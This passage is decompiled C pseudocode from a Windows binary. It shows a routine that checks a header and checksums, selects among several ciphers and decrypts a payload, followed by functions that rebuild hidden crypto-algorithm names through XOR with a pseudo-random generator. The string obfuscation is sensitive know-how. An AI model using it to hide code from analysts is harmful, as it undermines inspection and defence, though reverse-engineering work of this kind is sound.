  char *v6; // rdi
  unsigned __int64 v7; // rax
  char result; // al
  int v9; // eax
  char *v10; // rdx
  unsigned __int8 *v11; // rcx
  int v12; // eax
  unsigned __int8 *v13; // rcx
  int v14; // eax
  _BYTE *v15; // rcx
  unsigned __int64 v16; // rdi
  __int64 v17; // rdi
  void *v18; // rax
  __int64 v19; // rax
  void (__fastcall ***v20)(_QWORD, signed __int64); // rbx
  __int64 v21; // rdi
  void *v22; // rax
  __int64 v23; // rdi
  void *v24; // rax
  __int64 v25; // rdi
  void *v26; // rax
  __int64 v27; // rdi
  void *v28; // rax
  __int64 v29; // rax
  void *v30; // rsi
  _QWORD *v31; // rax
  _QWORD *v32; // rdi
  _QWORD *v33; // rax
  _BYTE *v34; // rax
  void *v35; // rsi
  _QWORD *v36; // rax
  _QWORD *v37; // rdi
  __int64 v38; // rax
  void (__fastcall ***v39)(_QWORD, signed __int64); // rcx
  Concurrency::details::ThreadScheduler *v40; // rsi
  const struct Concurrency::SchedulerPolicy *v41; // rax
  const struct Concurrency::SchedulerPolicy *v42; // rdi
  __int64 v43; // rax
  _BYTE *v44; // rax
  _QWORD *v45; // rsi
  __int64 v46; // r8
  __int64 v47; // rdx
  __int64 v48; // ST58_8
  const struct Concurrency::SchedulerPolicy *v49; // rcx
  void *v50; // rdx
  void *v51; // rdx
  const struct Concurrency::SchedulerPolicy *v52; // r14
  _QWORD *v53; // rax
  _QWORD *v54; // rdi
  __int64 v55; // rax
  _BYTE *v56; // rax
  _QWORD *v57; // rcx
  _BYTE *v58; // rax
  _BYTE *v59; // rax
  void *v60; // rdx
  char v61; // [rsp+20h] [rbp-498h]
  int v62; // [rsp+40h] [rbp-478h]
  const struct Concurrency::SchedulerPolicy *v63; // [rsp+48h] [rbp-470h]
  void (__fastcall ***v64)(_QWORD, signed __int64); // [rsp+50h] [rbp-468h]
  void *Dst; // [rsp+58h] [rbp-460h]
  char v66; // [rsp+60h] [rbp-458h]
  unsigned __int64 v67; // [rsp+68h] [rbp-450h]
  void *v68; // [rsp+70h] [rbp-448h]
  void *v69; // [rsp+78h] [rbp-440h]
  __int64 (__fastcall **v70)(void *); // [rsp+80h] [rbp-438h]
  __int64 (__fastcall **v71)(); // [rsp+88h] [rbp-430h]
  signed int *v72; // [rsp+90h] [rbp-428h]
  char v73; // [rsp+98h] [rbp-420h]
  __int64 v74; // [rsp+A8h] [rbp-410h]
  void *v75; // [rsp+B0h] [rbp-408h]
  char v76; // [rsp+C0h] [rbp-3F8h]
  __int64 v77; // [rsp+D0h] [rbp-3E8h]
  void *Memory; // [rsp+D8h] [rbp-3E0h]
  __int64 (__fastcall **v79)(); // [rsp+E8h] [rbp-3D0h]
  _QWORD *v80; // [rsp+F0h] [rbp-3C8h]
  __int64 v81; // [rsp+F8h] [rbp-3C0h]
  char v82; // [rsp+100h] [rbp-3B8h]
  char v83; // [rsp+118h] [rbp-3A0h]
  char v84; // [rsp+130h] [rbp-388h]
  char v85; // [rsp+148h] [rbp-370h]
  char v86; // [rsp+160h] [rbp-358h]
  char v87; // [rsp+178h] [rbp-340h]
  char v88; // [rsp+190h] [rbp-328h]
  char v89; // [rsp+1A8h] [rbp-310h]
  char v90; // [rsp+1C0h] [rbp-2F8h]
  char v91; // [rsp+1E0h] [rbp-2D8h]
  void *v92; // [rsp+2E0h] [rbp-1D8h]
  __int64 v93; // [rsp+2F0h] [rbp-1C8h]
  unsigned __int64 v94; // [rsp+2F8h] [rbp-1C0h]
  void *v95; // [rsp+300h] [rbp-1B8h]
  __int64 v96; // [rsp+310h] [rbp-1A8h]
  unsigned __int64 v97; // [rsp+318h] [rbp-1A0h]
  void *v98; // [rsp+320h] [rbp-198h]
  __int64 v99; // [rsp+330h] [rbp-188h]
  unsigned __int64 v100; // [rsp+338h] [rbp-180h]
  void *v101; // [rsp+340h] [rbp-178h]
  __int64 v102; // [rsp+350h] [rbp-168h]
  unsigned __int64 v103; // [rsp+358h] [rbp-160h]
  __int128 v104; // [rsp+360h] [rbp-158h]
  __int64 v105; // [rsp+370h] [rbp-148h]
  __int64 v106; // [rsp+378h] [rbp-140h]
  __int64 v107; // [rsp+380h] [rbp-138h]
  __int64 v108; // [rsp+388h] [rbp-130h]
  __int64 v109; // [rsp+390h] [rbp-128h]
  void (__fastcall ***v110)(_QWORD, signed __int64); // [rsp+3A8h] [rbp-110h]
  __int64 v111; // [rsp+400h] [rbp-B8h]
  void (__fastcall ***v112)(_QWORD, signed __int64); // [rsp+418h] [rbp-A0h]

  v81 = -2i64;
  v69 = a4;
  v4 = a3;
  v5 = a2;
  v6 = a1;
  v62 = 0;
  v7 = *((_QWORD *)a1 + 2);
  if ( !v7 || !*(_QWORD *)(a2 + 8) || !a4 || v7 <= 0x30 )
    return 0;
  v104 = 0ui64;
  v105 = 0i64;
  v106 = 0i64;
  v107 = 0i64;
  v108 = 0i64;
  sub_1400881C0(&v91, a1, 3, 1);
  sub_140088B10(&v91, &v104);
  sub_140024800((__int64)&v91);
  if ( (_QWORD)v104 != 1059156823i64 )
    return 0;
  if ( HIDWORD(v105) != 1 && !*(_QWORD *)(v4 + 8) )
    return 0;
  v9 = sub_14008C1F0(*(unsigned __int8 **)(v5 + 16), *(_DWORD *)(v5 + 8), 0xFFFFFFFF);
  if ( v107 != v9 )
    return 0;
  v94 = 15i64;
  v93 = 0i64;
  LOBYTE(v92) = 0;
  if ( *((_QWORD *)v6 + 3) < 0x10ui64 )
    v10 = v6;
  else
    v10 = *(char **)v6;
  sub_140004F20(&v92, v10 + 48, *((_QWORD *)v6 + 2) - 48i64);
  v11 = (unsigned __int8 *)&v92;
  if ( v94 >= 0x10 )
    v11 = (unsigned __int8 *)v92;
  v12 = sub_14008C1F0(v11, v93, 0xFFFFFFFF);
  if ( v108 == v12 || (_QWORD)v104 != 1059156823i64 )
    goto LABEL_164;
  if ( *((_QWORD *)v6 + 3) >= 0x10ui64 )
    v6 = *(char **)v6;
  sub_140053770((size_t *)&v92, 0i64, v6 + 44, 4ui64);
  v13 = (unsigned __int8 *)&v92;
  if ( v94 >= 0x10 )
    v13 = (unsigned __int8 *)v92;
  v14 = sub_14008C1F0(v13, v93, 0xFFFFFFFF);
  if ( v108 == v14 )
  {
LABEL_164:
    Dst = 0i64;
    v62 = 0;
    v15 = &v92;
    if ( v94 >= 0x10 )
      v15 = v92;
    v16 = (signed int)sub_14008C270(v15, v93, &Dst, &v62);
    sub_140022E80((__int64)&v66, Dst, v62);
    sub_140005230(&v92, 0i64, v16);
    memset(Dst, 0, v62);
    operator delete[](Dst);
    v64 = 0i64;
    if ( (_DWORD)v105 )
    {
      switch ( (_DWORD)v105 )
      {
        case 1:
          if ( v67 != 16 )
          {
            std::exception::exception((std::exception *)&v89);
            CxxThrowException(&v89, &_TI1_AVexception_std__);
          }
          v25 = *(_QWORD *)(v5 + 8);
          if ( (signed int)v25 > 32 )
            LODWORD(v25) = 32;
          v26 = operator new(0x190ui64);
          if ( v26 )
            v19 = sub_140087BE0(v26, *(_QWORD *)(v5 + 16), (signed int)v25, v68);
          else
            v19 = 0i64;
          break;
        case 2:
          if ( v67 != 16 )
          {
            std::exception::exception((std::exception *)&v82);
            CxxThrowException(&v82, &_TI1_AVexception_std__);
          }
          v23 = *(_QWORD *)(v5 + 8);
          if ( (signed int)v23 > 32 )
            LODWORD(v23) = 32;
          v24 = operator new(0x1148ui64);
          if ( v24 )
            v19 = sub_140087E10(v24, *(_QWORD *)(v5 + 16), (signed int)v23, v68);
          else
            v19 = 0i64;
          break;
        case 3:
          if ( v67 != 16 )
          {
            std::exception::exception((std::exception *)&v90);
            CxxThrowException(&v90, &_TI1_AVexception_std__);
          }
          v21 = *(_QWORD *)(v5 + 8);
          if ( (signed int)v21 > 32 )
            LODWORD(v21) = 32;
          v22 = operator new(0x2A0ui64);
          if ( v22 )
            v19 = sub_140087D00(v22, *(_QWORD *)(v5 + 16), (signed int)v21, v68);
          else
            v19 = 0i64;
          break;
        default:
          if ( (_DWORD)v105 != 4 )
          {
            std::exception::exception((std::exception *)&v84);
            CxxThrowException(&v84, &_TI1_AVexception_std__);
          }
          if ( v67 != 16 )
          {
            std::exception::exception((std::exception *)&v85);
            CxxThrowException(&v85, &_TI1_AVexception_std__);
          }
          v17 = *(_QWORD *)(v5 + 8);
          if ( (signed int)v17 > 32 )
            LODWORD(v17) = 32;
          v18 = operator new(0x98ui64);
          if ( v18 )
            v19 = sub_140087AB0(v18, *(_QWORD *)(v5 + 16), (signed int)v17, v68);
          else
            v19 = 0i64;
          break;
      }
      v20 = (void (__fastcall ***)(_QWORD, signed __int64))(v19 + 8);
      if ( !v19 )
        v20 = 0i64;
    }
    else
    {
      if ( v67 != 8 )
      {
        std::exception::exception((std::exception *)&v87);
        CxxThrowException(&v87, &_TI1_AVexception_std__);
      }
      v27 = *(_QWORD *)(v5 + 8);
      if ( (signed int)v27 > 56 )
        LODWORD(v27) = 56;
      v28 = operator new(0x10F0ui64);
      if ( v28 )
        v29 = sub_140087990(v28, *(_QWORD *)(v5 + 16), (signed int)v27, v68);
      else
        v29 = 0i64;
      v20 = (void (__fastcall ***)(_QWORD, signed __int64))(v29 + 8);
      if ( !v29 )
        v20 = 0i64;
    }
    v64 = v20;
    v100 = 15i64;
    v99 = 0i64;
    LOBYTE(v98) = 0;
    v30 = operator new(0xB8ui64);
    if ( v30 )
    {
      v31 = operator new(0x20ui64);
      v32 = v31;
      v63 = (const struct Concurrency::SchedulerPolicy *)v31;
      if ( v31 )
      {
        sub_140036DA0((__int64)v31, 0);
        *v32 = &off_1400AABD8;
        v32[1] = off_1400A9A98;
        v32[3] = &v98;
      }
      else
      {
        v32 = 0i64;
      }
      v61 = 0;
      v33 = sub_140057D20((__int64)v30, (__int64)v20, (__int64)v32, 4);
    }
    else
    {
      v33 = 0i64;
    }
    sub_14007AF30((__int64)&v109, &v92, 1, (__int64)v33);
    if ( v110 )
      (**v110)(v110, 1i64);
    v93 = 0i64;
    v34 = &v92;
    if ( v94 >= 0x10 )
      v34 = v92;
    *v34 = 0;
    v97 = 15i64;
    v96 = 0i64;
    LOBYTE(v95) = 0;
    if ( (_DWORD)v106 )
    {
      if ( (_DWORD)v106 == 1 )
      {
        v40 = (Concurrency::details::ThreadScheduler *)operator new(0x170ui64);
        if ( v40 )
        {
          v41 = (const struct Concurrency::SchedulerPolicy *)operator new(0x20ui64);
          v42 = v41;
          v63 = v41;
          if ( v41 )
          {
            sub_140036DA0((__int64)v41, 0);
            *(_QWORD *)v42 = &off_1400AABD8;
            *((_QWORD *)v42 + 1) = off_1400A9A98;
            *((_QWORD *)v42 + 3) = &v95;
          }
          else
          {
            v42 = 0i64;
          }
          v43 = Concurrency::details::ThreadScheduler::ThreadScheduler(v40, v42);
        }
        else
        {
          v43 = 0i64;
        }
        sub_14007AF30((__int64)&v111, &v98, 1, v43);
        v39 = v112;
      }
      else
      {
        if ( (_DWORD)v106 != 2 )
        {
          std::exception::exception((std::exception *)&v83);
          CxxThrowException(&v83, &_TI1_AVexception_std__);
        }
        v35 = operator new(0x170ui64);
        if ( v35 )
        {
          v36 = operator new(0x20ui64);
          v37 = v36;
          v63 = (const struct Concurrency::SchedulerPolicy *)v36;
          if ( v36 )
          {
            sub_140036DA0((__int64)v36, 0);
            *v37 = &off_1400AABD8;
            v37[1] = off_1400A9A98;
            v37[3] = &v95;
          }
          else
          {
            v37 = 0i64;
          }
          v38 = sub_140091BE0(v35, v37, 0i64, 0xFFFFFFFFi64, v61);
        }
        else
        {
          v38 = 0i64;
        }
        sub_14007AF30((__int64)&v109, &v98, 1, v38);
        v39 = v110;
      }
      if ( v39 )
        (**v39)(v39, 1i64);
    }
    else
    {
      sub_140004DF0(&v95, &v98, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    }
    v99 = 0i64;
    v44 = &v98;
    if ( v100 >= 0x10 )
      v44 = v98;
    *v44 = 0;
    v45 = 0i64;
    if ( *(_QWORD *)(v4 + 8) )
    {
      sub_1400565B0((__int64)&v111, 0i64);
      v46 = *(_QWORD *)(v4 + 8);
      v47 = *(_QWORD *)(v4 + 16);
      sub_140088320((__int64)&v109);
      v63 = (const struct Concurrency::SchedulerPolicy *)-1i64;
      (*(void (__fastcall **)(__int64 *, __int64 *, const struct Concurrency::SchedulerPolicy **, void **, signed __int64))(v109 + 248))(
        &v109,
        &v111,
        &v63,
        &qword_1400D8080,
        1i64);
      LOBYTE(v48) = 1;
      (*(void (__fastcall **)(__int64 *, _QWORD, _QWORD, signed __int64, __int64))(v111 + 40))(
        &v111,
        0i64,
        0i64,
        0xFFFFFFFFi64,
        v48);
      v72 = (signed int *)&unk_1400B2D00;
      v70 = &off_1400B2C20;
      v71 = off_1400B2C60;
      v79 = off_1400B2CA8;
      sub_14003C210(&v73);
      sub_14003C210(&v76);
      ((void (__fastcall *)(__int64 (__fastcall ***)(), __int64 *))v71[1])(&v71, &v111);
      if ( HIDWORD(v105) )
      {
        if ( HIDWORD(v105) != 1 )
        {
          std::exception::exception((std::exception *)&v86);
          CxxThrowException(&v86, &_TI1_AVexception_std__);
        }
      }
      else
      {
        v49 = (const struct Concurrency::SchedulerPolicy *)operator new(0x88ui64);
        v63 = v49;
        if ( v49 )
          v45 = sub_140087F30(v49, (__int64)&v72 + v72[1]);
        else
          v45 = 0i64;
      }
      v50 = Memory;
      memset(Memory, 0, 8 * v77);
      free(v50);
      v51 = v75;
      memset(v75, 0, 8 * v74);
      free(v51);
      if ( v110 )
        (**v110)(v110, 1i64);
      sub_1400566F0(&v111);
    }
    v103 = 15i64;
    v102 = 0i64;
    LOBYTE(v101) = 0;
    if ( v45 )
    {
      v52 = (const struct Concurrency::SchedulerPolicy *)operator new(0xC0ui64);
      v63 = v52;
      if ( v52 )
      {
        v53 = operator new(0x20ui64);
        v54 = v53;
        v80 = v53;
        if ( v53 )
        {
          sub_140036DA0((__int64)v53, 0);
          *v54 = &off_1400AABD8;
          v54[1] = off_1400A9A98;
          v54[3] = &v101;
        }
        else
        {
          v54 = 0i64;
        }
        v55 = sub_140057F50((__int64)v52, (__int64)v45, (__int64)v54, 18);
      }
      else
      {
        v55 = 0i64;
      }
      sub_14007AF30((__int64)&v109, &v95, 1, v55);
      if ( v110 )
        (**v110)(v110, 1i64);
    }
    else
    {
      sub_140004DF0(&v101, &v95, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    }
    v96 = 0i64;
    v56 = &v95;
    if ( v97 >= 0x10 )
      v56 = v95;
    *v56 = 0;
    if ( v102 != *((_QWORD *)&v104 + 1) )
    {
      std::exception::exception((std::exception *)&v88);
      CxxThrowException(&v88, &_TI1_AVexception_std__);
    }
    v57 = v69;
    *((_QWORD *)v69 + 2) = 0i64;
    if ( v57[3] < 0x10ui64 )
      v58 = v57;
    else
      v58 = (_BYTE *)*v57;
    *v58 = 0;
    sub_140004DF0(v57, &v101, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v102 = 0i64;
    v59 = &v101;
    if ( v103 >= 0x10 )
      v59 = v101;
    *v59 = 0;
    if ( v103 >= 0x10 )
      operator delete(v101);
    v103 = 15i64;
    v102 = 0i64;
    LOBYTE(v101) = 0;
    if ( v45 )
      (*(void (__fastcall **)(_QWORD *, signed __int64))*v45)(v45, 1i64);
    if ( v97 >= 0x10 )
      operator delete(v95);
    v97 = 15i64;
    v96 = 0i64;
    LOBYTE(v95) = 0;
    if ( v100 >= 0x10 )
      operator delete(v98);
    v100 = 15i64;
    v99 = 0i64;
    LOBYTE(v98) = 0;
    if ( v20 )
      (**v20)(v20, 1i64);
    v60 = v68;
    memset(v68, 0, v67);
    free(v60);
    if ( v94 >= 0x10 )
      operator delete(v92);
    result = 1;
  }
  else
  {
    if ( v94 >= 0x10 )
      operator delete(v92);
    result = 0;
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 140087990: using guessed type __int64 __fastcall sub_140087990(_QWORD, _QWORD, _QWORD, _QWORD);
// 140087AB0: using guessed type __int64 __fastcall sub_140087AB0(_QWORD, _QWORD, _QWORD, _QWORD);
// 140087BE0: using guessed type __int64 __fastcall sub_140087BE0(_QWORD, _QWORD, _QWORD, _QWORD);
// 140087D00: using guessed type __int64 __fastcall sub_140087D00(_QWORD, _QWORD, _QWORD, _QWORD);
// 140087E10: using guessed type __int64 __fastcall sub_140087E10(_QWORD, _QWORD, _QWORD, _QWORD);
// 140088320: using guessed type __int64 __fastcall sub_140088320(__int64);
// 140088B10: using guessed type __int64 __fastcall sub_140088B10(_QWORD, _QWORD);
// 140091BE0: using guessed type __int64 __fastcall sub_140091BE0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();
// 1400AABD8: using guessed type __int64 (__fastcall *off_1400AABD8)();
// 1400B2C20: using guessed type __int64 (__fastcall *off_1400B2C20)(void *);
// 1400B2C60: using guessed type __int64 (__fastcall *off_1400B2C60[17])();
// 1400B2CA8: using guessed type __int64 (__fastcall *off_1400B2CA8[8])();
// 1400D4728: using guessed type int _TI1_AVexception_std__;

//----- (000000014008A480) ----------------------------------------------------
signed __int64 sub_14008A480()
{
  return 16i64;
}

//----- (000000014008A490) ----------------------------------------------------
signed __int64 sub_14008A490()
{
  return 20i64;
}

//----- (000000014008A4A0) ----------------------------------------------------
_QWORD *__fastcall sub_14008A4A0(__int64 a1, _QWORD *a2)
{
  *a2 = &unk_1400AA050;
  a2[1] = 15i64;
  return a2;
}

//----- (000000014008A4C0) ----------------------------------------------------
__int64 sub_14008A4C0()
{
  char v1; // [rsp+10h] [rbp+10h]

  return sub_14008B630(&v1);
}
// 14008B630: using guessed type __int64 __fastcall sub_14008B630(_QWORD);

//----- (000000014008A4D0) ----------------------------------------------------
__int64 __fastcall sub_14008A4D0(__int64 a1)
{
  __int64 result; // rax

  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 8) + 152i64))(a1 - 8);
  if ( result )
    result += 16i64;
  return result;
}

//----- (000000014008A500) ----------------------------------------------------
_QWORD *__fastcall sub_14008A500(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DD11C;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DD11C & 1 )
  {
    v5 = byte_1400DD118;
  }
  else
  {
    v4 = 69069 * dword_1400DD034 + 1234567;
    v1 = dword_1400DD11C | 1;
    dword_1400DD034 = v4;
    dword_1400DD11C |= 1u;
    dword_1400DD02C = HIWORD(dword_1400DD02C) + 36969 * (unsigned __int16)dword_1400DD02C;
    LOBYTE(v4) = (BYTE2(dword_1400DD038) + 80 * dword_1400DD038) ^ v4;
    dword_1400DD038 = HIWORD(dword_1400DD038) + 18000 * (unsigned __int16)dword_1400DD038;
    v5 = (((unsigned int)dword_1400DD030 >> 13) ^ 32 * dword_1400DD030 ^ dword_1400DD030) + v4;
    dword_1400DD030 ^= ((unsigned int)dword_1400DD030 >> 13) ^ 32 * (dword_1400DD030 ^ (dword_1400DD030 << 12));
    byte_1400DD118 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DD11C = v1 | 2;
    byte_1400DD120[0] = v5 ^ 0x41;
    byte_1400DD121 = (v5 - 1) ^ 0x64;
    byte_1400DD122 = (v5 - 2) ^ 0x6C;
    byte_1400DD123 = (v5 - 3) ^ 0x65;
    byte_1400DD124 = (v5 - 4) ^ 0x72;
    byte_1400DD125 = (v5 - 5) ^ 0x33;
    byte_1400DD126 = (v5 - 6) ^ 0x32;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 7ui64 )
  {
    sub_140004790(Src, 7ui64, 0i64);
    v5 = byte_1400DD118;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_DWORD *)v6 = 0;
  *((_WORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 6) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 7i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 7) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DD120[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 7 );
  return v3;
}
// 1400DD02C: using guessed type int dword_1400DD02C;
// 1400DD030: using guessed type int dword_1400DD030;
// 1400DD034: using guessed type int dword_1400DD034;
// 1400DD038: using guessed type int dword_1400DD038;
// 1400DD118: using guessed type char byte_1400DD118;
// 1400DD11C: using guessed type int dword_1400DD11C;
// 1400DD121: using guessed type char byte_1400DD121;
// 1400DD122: using guessed type char byte_1400DD122;
// 1400DD123: using guessed type char byte_1400DD123;
// 1400DD124: using guessed type char byte_1400DD124;
// 1400DD125: using guessed type char byte_1400DD125;
// 1400DD126: using guessed type char byte_1400DD126;

//----- (000000014008A6D0) ----------------------------------------------------
_QWORD *__fastcall sub_14008A6D0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DD108;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DD108 & 1 )
  {
    v5 = byte_1400DD107;
  }
  else
  {
    v4 = 69069 * dword_1400DD034 + 1234567;
    v1 = dword_1400DD108 | 1;
    dword_1400DD034 = v4;
    dword_1400DD108 |= 1u;
    dword_1400DD02C = HIWORD(dword_1400DD02C) + 36969 * (unsigned __int16)dword_1400DD02C;
    LOBYTE(v4) = (BYTE2(dword_1400DD038) + 80 * dword_1400DD038) ^ v4;
    dword_1400DD038 = HIWORD(dword_1400DD038) + 18000 * (unsigned __int16)dword_1400DD038;
    v5 = (((unsigned int)dword_1400DD030 >> 13) ^ 32 * dword_1400DD030 ^ dword_1400DD030) + v4;
    dword_1400DD030 ^= ((unsigned int)dword_1400DD030 >> 13) ^ 32 * (dword_1400DD030 ^ (dword_1400DD030 << 12));
    byte_1400DD107 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DD108 = v1 | 2;
    byte_1400DD110[0] = v5 ^ 0x43;
    byte_1400DD111 = (v5 - 1) ^ 0x61;
    byte_1400DD112 = (v5 - 2) ^ 0x6D;
    byte_1400DD113 = (v5 - 3) ^ 0x65;
    byte_1400DD114 = (v5 - 4) ^ 0x6C;
    byte_1400DD115 = (v5 - 5) ^ 0x6C;
    byte_1400DD116 = (v5 - 6) ^ 0x69;
    byte_1400DD117 = (v5 - 7) ^ 0x61;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 8ui64 )
  {
    sub_140004790(Src, 8ui64, 0i64);
    v5 = byte_1400DD107;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 8i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 8) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DD110[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 8 );
  return v3;
}
// 1400DD02C: using guessed type int dword_1400DD02C;
// 1400DD030: using guessed type int dword_1400DD030;
// 1400DD034: using guessed type int dword_1400DD034;
// 1400DD038: using guessed type int dword_1400DD038;
// 1400DD107: using guessed type char byte_1400DD107;
// 1400DD108: using guessed type int dword_1400DD108;
// 1400DD111: using guessed type char byte_1400DD111;
// 1400DD112: using guessed type char byte_1400DD112;
// 1400DD113: using guessed type char byte_1400DD113;
// 1400DD114: using guessed type char byte_1400DD114;
// 1400DD115: using guessed type char byte_1400DD115;
// 1400DD116: using guessed type char byte_1400DD116;
// 1400DD117: using guessed type char byte_1400DD117;

//----- (000000014008A8A0) ----------------------------------------------------
_QWORD *__fastcall sub_14008A8A0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DD0E8;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DD0E8 & 1 )
  {
    v5 = byte_1400DD0E7;
  }
  else
  {
    v4 = 69069 * dword_1400DD034 + 1234567;
    v1 = dword_1400DD0E8 | 1;
    dword_1400DD034 = v4;
    dword_1400DD0E8 |= 1u;
    dword_1400DD02C = HIWORD(dword_1400DD02C) + 36969 * (unsigned __int16)dword_1400DD02C;
    LOBYTE(v4) = (BYTE2(dword_1400DD038) + 80 * dword_1400DD038) ^ v4;
    dword_1400DD038 = HIWORD(dword_1400DD038) + 18000 * (unsigned __int16)dword_1400DD038;
    v5 = (((unsigned int)dword_1400DD030 >> 13) ^ 32 * dword_1400DD030 ^ dword_1400DD030) + v4;
    dword_1400DD030 ^= ((unsigned int)dword_1400DD030 >> 13) ^ 32 * (dword_1400DD030 ^ (dword_1400DD030 << 12));
    byte_1400DD0E7 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DD0E8 = v1 | 2;
    byte_1400DD0EC[0] = v5 ^ 0x43;
    byte_1400DD0ED = (v5 - 1) ^ 0x42;
    byte_1400DD0EE = (v5 - 2) ^ 0x43;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 3ui64 )
  {
    sub_140004790(Src, 3ui64, 0i64);
    v5 = byte_1400DD0E7;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_WORD *)v6 = 0;
  *((_BYTE *)v6 + 2) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 3i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 3) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DD0EC[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 3 );
  return v3;
}
// 1400DD02C: using guessed type int dword_1400DD02C;
// 1400DD030: using guessed type int dword_1400DD030;
// 1400DD034: using guessed type int dword_1400DD034;
// 1400DD038: using guessed type int dword_1400DD038;
// 1400DD0E7: using guessed type char byte_1400DD0E7;
// 1400DD0E8: using guessed type int dword_1400DD0E8;
// 1400DD0ED: using guessed type char byte_1400DD0ED;
// 1400DD0EE: using guessed type char byte_1400DD0EE;

//----- (000000014008AA40) ----------------------------------------------------
_QWORD *__fastcall sub_14008AA40(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DD0C8;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DD0C8 & 1 )
  {
    v5 = byte_1400DD0C5;
  }
  else
  {
    v4 = 69069 * dword_1400DD034 + 1234567;
    v1 = dword_1400DD0C8 | 1;
    dword_1400DD034 = v4;
    dword_1400DD0C8 |= 1u;
    dword_1400DD02C = HIWORD(dword_1400DD02C) + 36969 * (unsigned __int16)dword_1400DD02C;
    LOBYTE(v4) = (BYTE2(dword_1400DD038) + 80 * dword_1400DD038) ^ v4;
    dword_1400DD038 = HIWORD(dword_1400DD038) + 18000 * (unsigned __int16)dword_1400DD038;
    v5 = (((unsigned int)dword_1400DD030 >> 13) ^ 32 * dword_1400DD030 ^ dword_1400DD030) + v4;
    dword_1400DD030 ^= ((unsigned int)dword_1400DD030 >> 13) ^ 32 * (dword_1400DD030 ^ (dword_1400DD030 << 12));
    byte_1400DD0C5 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DD0C8 = v1 | 2;
    byte_1400DD0D0[0] = v5 ^ 0x45;
    byte_1400DD0D1 = (v5 - 1) ^ 0x4D;
    byte_1400DD0D2 = (v5 - 2) ^ 0x53;
    byte_1400DD0D3 = (v5 - 3) ^ 0x41;
    byte_1400DD0D4 = (v5 - 4) ^ 0x2D;
    byte_1400DD0D5 = (v5 - 5) ^ 0x50;
    byte_1400DD0D6 = (v5 - 6) ^ 0x4B;
    byte_1400DD0D7 = (v5 - 7) ^ 0x43;
    byte_1400DD0D8 = (v5 - 8) ^ 0x53;
    byte_1400DD0D9 = (v5 - 9) ^ 0x31;
    byte_1400DD0DA = (v5 - 10) ^ 0x2D;
